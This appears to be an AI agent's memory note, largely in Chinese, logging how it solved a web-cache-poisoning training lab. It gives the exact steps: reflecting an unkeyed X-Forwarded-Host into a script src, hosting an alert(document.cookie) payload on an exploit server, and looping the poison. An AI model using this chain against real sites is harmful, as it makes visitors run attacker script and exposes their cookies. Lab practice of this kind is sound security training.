---
metadata:
  node_type: memory
name: "PRS arm A lab-web-cache-poisoning-with-an-unkeyed-header"
description: "arm A 基线:lab-web-cache-poisoning-with-an-unkeyed-header 冷实例一次通过 - X-Forwarded-Host 未入缓存键,反射进 script src,投毒首页后受害者命中即 solved"
last_updated: 2026-10-09T11:48:49+08:00
created: 2026-10-09T11:48:49+08:00
---

# 2026-10-09 arm A 基线

题:lab-web-cache-poisoning-with-an-unkeyed-header(canonical 路径 launch-url 直取,reused:false 冷实例)
终态:solved。banner_verdict → solved:true,"Congratulations, you solved the lab!"。一次通过。

## 链路(全程走件)
1. range_launch launch-url /web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header --jar /tmp/cj1.json → 实例 URL,reused:false。
2. http_dump 首页 → 200,X-Cache: hit,max-age=30,Age 7(已被缓存)。
3. header_fuzz 25 个候选头(含 X-Forwarded-Host)全返回 X-Cache: hit、len 11076、marker_reflected:false
   ⇒ 命中态下看不到反射(源站没渲染)。
4. 关键补测:加缓存键扰动 ?cb=zz1 + 头 X-Forwarded-Host: zzcanary2.example → X-Cache: miss,body 第 11 行
   `<script type="text/javascript" src="//zzcanary2.example/resources/js/tracking.js">` ⇒ 头未入缓存键且反射进 script src。
5. 实例页 HTML 内含 `#exploit-link` href = exploit server 根(launch 信封 exploit_server:null 不排除其存在)。
6. http_session post 到 exploit server:`urlIsHttps=on`、`responseFile=/resources/js/tracking.js`、
   `responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript; charset=utf-8`、
   `responseBody=alert(document.cookie)`、`formAction=STORE`;随后 http_dump 该路径确认 200 + body=alert(document.cookie)。
7. nap 31s 让干净首页条目过期,再 GET / + X-Forwarded-Host: exploit-<id>.exploit-server.net → X-Cache: miss(源站渲染并入缓存);
   紧接着无头 GET / → X-Cache: hit、Age 9,body 的 script src 指向 exploit host(投毒已固化)。
8. poison_loop / --header X-Forwarded-Host:exploit-<id>... --interval-secs 5 --count 30 保毒;nap 40s 后 banner_verdict → solved。

## 坑
- 未键头反射的发现面必须先破缓存命中(加 ?cb= 或等 max-age 过期),否则 header_fuzz/http_dump 一律看到旧缓存体、marker_reflected 恒 false。
- X-Forwarded-Host 不入缓存键 ⇒ 投毒 "/" 即覆盖所有访客(含模拟受害者);max-age 只有 30s,单发投毒不够,需循环保毒后等受害者命中。
- exploit server 的信封/根页字段:STORE 走 POST /,responseFile 即"路径即文件",不需要额外目录。

